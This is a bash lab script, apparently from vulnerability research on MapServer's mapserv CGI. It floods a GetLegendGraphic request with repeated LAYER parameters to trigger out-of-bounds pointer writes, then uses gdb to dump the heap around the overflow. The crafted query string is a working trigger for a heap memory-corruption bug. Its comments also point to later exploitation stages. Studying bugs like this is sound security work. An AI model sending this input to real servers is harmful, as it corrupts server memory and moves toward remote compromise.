#!/bin/bash
# Consumer-reality inspection on the plain stock build: where the OOB pointer
# appends land and what reads them after the loop. Debugger observation only,
# not execution or rung 5. All input stays in this lab (no listener started).
set -u
cd "$(dirname "$0")" || exit 2
K=${1:-95}
VAL=${2:-DEADBEEFCAFEBABE}
MAP=$(realpath legend.map)
QS="map=${MAP}&SERVICE=WMS&VERSION=1.3.0&REQUEST=GetLegendGraphic&BBOX=0,0,1,1"
for ((i=0; i<K; i++)); do QS+="&LAYER=${VAL}"; done
export REQUEST_METHOD=GET QUERY_STRING="$QS" SCRIPT_NAME=/mapserv
export MAPSERVER_CONFIG_FILE="$PWD/mapserver.conf"
export MS_MAP_PATTERN='^/'
export SERVER_NAME=127.0.0.1 SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.1 GATEWAY_INTERFACE=CGI/1.1
gdb -q --batch \
  -ex 'set pagination off' \
  -ex 'set breakpoint pending on' \
  -ex 'break mapwms.cpp:6017' \
  -ex 'run' \
  -ex 'printf "NumParams=%d\n", req->NumParams' \
  -ex 'printf "Names=%p Values=%p delta=%ld\n", req->ParamNames, req->ParamValues, (char*)req->ParamValues-(char*)req->ParamNames' \
  -ex 'printf "first two OOB Names slots = ParamValues chunk header:\n"' \
  -ex 'x/2gx (char*)req->ParamNames+800' \
  -ex 'printf "OOB Values slots (base+800), all heap pointers:\n"' \
  -ex 'x/8gx (char*)req->ParamValues+800' \
  -ex 'printf "attacker string is a valid msStrdup buffer:\n"' \
  -ex 'x/s req->ParamValues[100]' \
  -ex 'bt 4' \
  ./build-plain/mapserv
